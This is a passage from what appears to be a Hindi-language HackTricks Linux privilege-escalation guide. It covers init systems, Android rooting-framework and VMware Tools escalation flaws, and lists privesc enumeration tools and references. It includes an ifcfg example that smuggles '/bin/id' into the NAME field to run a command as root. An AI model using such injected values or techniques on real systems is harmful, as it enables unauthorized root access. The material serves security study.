उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note the blank space between Network and /bin/id_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` में **scripts** होते हैं जो System V init (SysVinit) के लिए हैं, जो **classic Linux service management system** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के जरिए चलाया जा सकता है। Redhat systems में एक alternative path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा introduced एक नया **service management** है, और service management tasks के लिए configuration files का उपयोग करता है। Upstart में transition के बावजूद, compatibility layer की वजह से SysVinit scripts अभी भी Upstart configurations के साथ उपयोग किए जाते हैं।

**systemd** एक modern initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसी advanced features प्रदान करता है। यह files को `/usr/lib/systemd/` में distribution packages के लिए और `/etc/systemd/system/` में administrator modifications के लिए organize करता है, जिससे system administration process streamlined हो जाता है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आमतौर पर एक syscall hook करते हैं ताकि privileged kernel functionality को userspace manager के लिए expose किया जा सके। Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) एक local app को manager की नकल करने और पहले से rooted devices पर root तक escalate करने में सक्षम बना सकती है। अधिक जानें और exploitation details यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में Regex-driven service discovery एक binary path को process command lines से extract कर सकती है और उसे privileged context में -v के साथ execute कर सकती है। Permissive patterns (e.g., using \S) writable locations (e.g., /tmp/httpd) में attacker-staged listeners से match हो सकते हैं, जिससे root के रूप में execution हो सकती है (CWE-426 Untrusted Search Path)।

अधिक जानें और यहाँ अन्य discovery/monitoring stacks पर लागू एक generalized pattern देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns enumerate करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
